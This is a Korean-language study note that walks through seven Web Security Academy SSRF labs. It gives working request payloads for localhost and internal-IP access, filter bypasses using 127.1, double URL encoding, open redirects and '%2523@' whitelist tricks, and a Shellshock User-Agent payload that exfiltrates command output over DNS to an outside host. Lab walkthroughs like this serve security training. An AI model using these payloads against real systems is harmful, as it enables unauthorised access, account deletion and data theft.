
# LAP

# 1. [초심자] 로컬 서버에 대한 기본 SSRF

- POST 방식 url 호출 시 파라미터로 localhost 호출
```
http://localhost/admin
```

# 2. [초심자] 다른 백엔드 시스템에 대한 기본 SSRF

- POST 방식 url 호출 시 파라미터로 ip 호출 
- 'x'는 인트루더로 찾기
```
http://192.168.0.x/admin
```

# 3. [실무자, 버프프로] 대역 외 감지 기능을 갖춘 블라인드 SSRF 

> referer에 외부 대역 IP 삽입해서 외부 호출 간의 내용 확인(드림핵 툴 처럼)
> 완료하려면 버프 프로 , collaborator 사용 필요

1. 제품 조회 요청 url
```
GET /product?productId=1 HTTP/2
Host: 0a4000c103c7b8dd80b976ff004800c0.web-security-academy.net
Cookie: session=R8TkIzmSOYI9MyP0FDPEPslMDuZofNpL
Sec-Ch-Ua: "Not_A Brand";v="8", "Chromium";v="120"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a4000c103c7b8dd80b976ff004800c0.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7
Priority: u=0, i
```

2. Referer을 외부 대역 ip
	- collaborater 사용해서 외부 도메인 Referer에 삽입 
```
Referer: https://0a4000c103c7b8dd80b976ff004800c0.web-security-academy.net/
-> 
https://www.abcdef.com
```


# 4. [실무자] 블랙리스트 기반 입력 필터를 사용하는 SSRF 

> 127.1 , 2중 url인코딩 

1. 재고관리 조회 url 
```
POST /product/stock HTTP/2

stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1
```

2. 127.0.0.1 호출 시도 
	- block 처리 됨 , localhost도 동일
```
stockApi=http://127.0.0.1/

->

HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 51

"External stock check blocked for security reasons"
```

3. 127.1 우회 시도 
	- 정상 응답 조회 확인 
```
stockApi=http://127.1/

->

HTTP/2 200 OK
메인페이지 
```

4. 127.1/admin 페이지 접근 시도
```
stockApi=http://127.1/admin

->

"External stock check blocked for security reasons"
```

5. 이중 url인코딩으로 admin우회 시도
```
stockApi=http://127.1/%2561dmin

->

admin페이지 접근 성공
```

![[Pasted image 20240105103406.png]]

6. carlos 삭제 시 url 
```
GET /admin/delete?username=carlos

->

권한없으므로 접근 불가 
```

7. 재고관리 조회 시 삭제 url 호출
```
stockApi=http://127.1/%2561dmin/delete?username=carlos

->

carlos 삭제 성공
```


# 5. [실무자] Open Redirection 취약점을 통한 필터 우회기능이 있는 SSRF

> api 호출 기능에 open redirection url 사용해서 관리자 페이지 접근

 1. 재고 조회 시 stocapi로 관리인터페이스 호출 시도 
	- 기존 url도 path 부터 경로를 받기 때문에 http부터 경로 호출 불가 
```
// 기존
stockApi=/product/stock/check?productId=1&storeId=1

// 변경 
stockApi=http://192.168.0.12:8080/admin

->

"Invalid external stock check url 'Invalid URL'"
```

2. Open Redirection 찾기
```
// 다음페이지 버튼 클릭 시 
GET /product/nextProduct?currentProductId=1&path=/product?productId=2

-> 

// Redirection 됨 
GET /product?productId=2
```

3. 관리인터페이스로 리다이렉션 되도록 한다. 
```
stockApi=/product/nextProduct?currentProductId=1%26path=http://192.168.0.12:8080/admin

->

관리인터페이스 이동 
```

4. 관리 인터페이스 에서 삭제 기능 url 확인 후 , api호출 시 삭제 기능 까지 호출 
```
stockApi=/product/nextProduct?currentProductId=1%26path=http://192.168.0.12:8080/admin/delete?username=carlos

->

삭제 기능 동작 확인
```


# 6. [전문가, 버프프로] Shellshock 공격을 이용한 블라인드 SSRF

> referer에 외부대역 url 사용 (드림핵 툴)
> 완료 하려면 버프프로 Collaborator 필요

- 문제 `192.168.0.X` 공격

1. 일반 페이지 호출 url
```
GET /product?productId=1 HTTP/2
Host: 0ad000f504543524817343420032005a.web-security-academy.net
Cookie: session=zyMaFDg4vKk6m8Oa6dzCKoPmuq7NlMQX
Sec-Ch-Ua: "Not_A Brand";v="8", "Chromium";v="120"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0ad000f504543524817343420032005a.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7
Priority: u=0, i
```

2. shell shock  user-agent 구글 검색 하여 페이로드 찾기 
	- intruder 로 1 - 255 까지

```
User-Agent: () { :; }; /bin/nslookup $(whoami) .외부url.com
Referer: http://192.168.0.1:8080/ 
```


# 7. [전문가] 화이트리스트 기반 입력 필터를 사용하는 SSRF

- 관리인터페이스 접근 http://localhost/admin 

1. 재고관리 api 
```
POST /product/stock

stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=1

->

HTTP/2 200 OK
Content-Type: text/plain; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 3

492
```

2. 127.0.0.1 호출 시 
	- host는 반드시 stock.weliketoshop.net 이어야 한다고 함 
```
stockApi=http://127.0.0.1/

->

"External stock check host must be stock.weliketoshop.net"
```

3. stock.weliketoshop.net url 대입
```
stockApi=http://stock.weliketoshop.net/

->

HTTP/2 500 Internal Server Error

Could not connect to external stock check service
```

4. 특정 사이트는 계정으로 접속 하는 경우가 있다. 
```
stockApi=http://username@stock.weliketoshop.net/

->

HTTP/2 500 Internal Server Error

Could not connect to external stock check service
```

5. # 삽입 시 아래의 url을 체크 하지 않는 것으로 보인다. 
```
stockApi=http://username#@stock.weliketoshop.net/

->

HTTP/2 400 Bad Request

"External stock check host must be stock.weliketoshop.net"
```

6. url 인코딩 
```
stockApi=http://username%23@stock.weliketoshop.net/

->

HTTP/2 400 Bad Request

"External stock check host must be stock.weliketoshop.net"
```

7. 2중 url 인코딩 
	- 해당 url의 화이트리스트를 통과 함.
```
stockApi=http://username%2523@stock.weliketoshop.net/

->

HTTP/2 500 Internal Server Error

Could not connect to external stock check service
```

8. localhost 접근  , 관리자 패널 접근 성공 
```
stockApi=http://localhost%2523@stock.weliketoshop.net/

->

HTTP/2 200 OK
```

9. 관리자 패널 에서 admin 페이지 url 및 삭제 

```
stockApi=http://localhost%2523@stock.weliketoshop.net/admin/delete?username=carlos

->

HTTP/2 302 Found
```



